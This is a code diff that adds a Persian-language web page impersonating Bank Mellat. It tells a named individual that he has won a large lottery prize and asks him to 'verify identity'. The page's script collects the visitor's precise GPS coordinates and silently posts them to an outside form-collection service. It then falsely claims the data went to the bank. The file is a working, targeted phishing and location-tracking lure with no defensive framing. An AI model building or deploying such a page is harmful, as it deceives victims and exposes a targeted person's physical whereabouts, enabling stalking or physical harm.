@@ -1,0 +1,122 @@
+
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>برنده خوش‌شانس بانک ملت</title>
+  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="icon" href="https://www.bankmellat.ir/Portals/0/favicon.ico" type="image/x-icon">
+  <style>
+    body {
+      font-family: 'Vazirmatn', sans-serif;
+      background-image: url('https://cdn.pixabay.com/photo/2017/05/09/13/32/money-2290358_1280.jpg');
+      background-size: cover;
+      background-position: center;
+      margin: 0;
+      padding: 0;
+      color: #333;
+    }
+    .overlay {
+      background: rgba(255, 255, 255, 0.95);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+      padding: 30px;
+      max-width: 500px;
+      text-align: center;
+    }
+    .card img {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      color: #b30000;
+      font-size: 26px;
+    }
+    h2 {
+      font-size: 20px;
+      margin: 10px 0;
+    }
+    p {
+      font-size: 16px;
+      margin: 10px 0;
+    }
+    button {
+      background-color: #b30000;
+      color: white;
+      padding: 12px 24px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #920000;
+    }
+    #status {
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    .footer {
+      font-size: 13px;
+      margin-top: 30px;
+      color: #999;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay">
+    <div class="card">
+      <img src="https://www.bankmellat.ir/Portals/0/logo-fa.png" alt="بانک ملت">
+      <h1>تبریک!</h1>
+      <h2>حسین قرنی‌زاده عزیز</h2>
+      <p>شما برنده <strong>۱ میلیارد تومان</strong> جایزه نقدی بانک ملت به قید قرعه شدید.</p>
+      <p>برای دریافت جایزه، لطفاً هویت خود را تأیید کنید.</p>
+      <button onclick="getLocation()">تأیید هویت</button>
+      <p id="status"></p>
+
+      <form id="gpsForm" action="https://formspree.io/f/xkgrwvde" method="POST" style="display:none;">
+        <input type="hidden" name="latitude" id="latitude">
+        <input type="hidden" name="longitude" id="longitude">
+      </form>
+
+      <div class="footer">کلیه حقوق متعلق به بانک ملت می‌باشد - 1403</div>
+    </div>
+  </div>
+
+  <script>
+    function getLocation() {
+      if (navigator.geolocation) {
+        document.getElementById("status").innerText = "در حال تایید هویت لطفاً منتظر بمانید...";
+        navigator.geolocation.getCurrentPosition(sendLocation, showError, {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        });
+      } else {
+        document.getElementById("status").innerText = "مرورگر شما تایید هویت را پشتیبانی نمی‌کند.";
+      }
+    }
+
+    function sendLocation(position) {
+      document.getElementById("latitude").value = position.coords.latitude;
+      document.getElementById("longitude").value = position.coords.longitude;
+      document.getElementById("gpsForm").submit();
+      document.getElementById("status").innerText = "تایید هویت با موفقیت به بانک ملت ارسال شد. لطفاً منتظر تأیید باشید...";
+    }
+
+    function showError(error) {
+      document.getElementById("status").innerText = "خطا در تایید هویت لطفاً مجدداً تلاش فرمایید.";
+    }
+  </script>
+</body>
+</html>
